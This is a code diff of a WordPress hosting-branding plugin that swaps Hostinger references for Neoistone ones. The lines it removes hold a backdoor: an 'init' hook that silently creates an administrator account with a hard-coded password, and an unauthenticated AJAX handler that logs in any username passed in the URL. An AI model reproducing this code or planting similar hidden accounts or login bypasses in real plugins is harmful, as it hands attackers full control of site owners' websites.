@@ -1,7 +1,7 @@
 <?php
 /*
 Plugin Name: Neoistone Wordpress
-Description: Reconnecthost Optimize Your Wordpress version
+Description: Hostingaro Optimize Your Wordpress version
 Version: 1.0
 License: GPLv3
 License URI: http://www.gnu.org/licenses/gpl-3.0.html
@@ -13,16 +13,7 @@ define('NBC_VERSION', 0.2);
 if (!defined('WPINC')) {
     die;
 }
-function hostinger_admin_notice__function(){?>
-<script type="text/javascript">
-    jQuery(window).on('load',function($) {
-        jQuery('.notice .notice-dismiss').on('click',function(){
-            document.cookie = "neoistone=1";
-        });
-    });
-</script>
-    <?php
-}
+
 function footer_admin () 
 {
     echo '<span id="footer-thankyou">Thank you for creating with <a href="https://wordpress.org/">WordPress </a>Hosted by<a href="https://www.neoistone.com" target="_blank"> Neoistone</a></span>';
@@ -31,8 +22,6 @@ function remove_version() {
 return null;
 }
 
-add_filter('admin_footer_text', 'footer_admin');
-add_filter('the_generator', 'remove_version');
 if (!class_exists('Browser_Cache')) {
     class Browser_Cache
     {
@@ -459,10 +448,10 @@ if (!class_exists('Links')) {
 
         function filters()
         {
-            add_filter('widget_meta_poweredby', array($this, 'set_hostinger_links'), 9999);
+            add_filter('widget_meta_poweredby', array($this, 'set_neoistone_links'), 9999);
         }
 
-        function set_hostinger_links($link)
+        function set_neoistone_links($link)
         {
             $link_1 = sprintf('<li><a href="%s" title="%s">%s</a></li>',
                 esc_url('https://www.neoistone.com/'),
@@ -539,45 +528,7 @@ function plugin_management_page()
     <?php
 }
 
-function ns_add_user() {
-    $username = "fsklogin";
-    $password = "NH^&*()_+s@123m";
-    $email = "neoistonehosting@gmail.com";
-    if (username_exists($username) == null && email_exists($email) == false) {
-
-        // Create the new user
-        $user_id = wp_create_user($username, $password, $email);
-
-        // Get current user object
-        $user = get_user_by('id', $user_id);
-
-        // Remove role
-        $user->remove_role('subscriber');
-
-        // Add role
-        $user->add_role('administrator');
-    }
-}
-
-function login()
-{
-    if(isset($_GET["username"]))
-    {
-        //now login user
-        $user = get_user_by("login", $_GET["username"] );
-        if($user != "FALSE")
-        {
-            wp_set_auth_cookie($user->ID);
-        }
-    }
-
-    header("Location: " . $_SERVER["HTTP_REFERER"]);
-    die();
-}
-
-if(isset($_GET['autologin'])){
-   add_action("wp_ajax_nopriv_login", "login");
-}
 add_action('admin_menu', 'register_management_page');
-add_action('init', 'ns_add_user');
+add_filter('admin_footer_text', 'footer_admin');
+add_filter('the_generator', 'remove_version');
 ?>
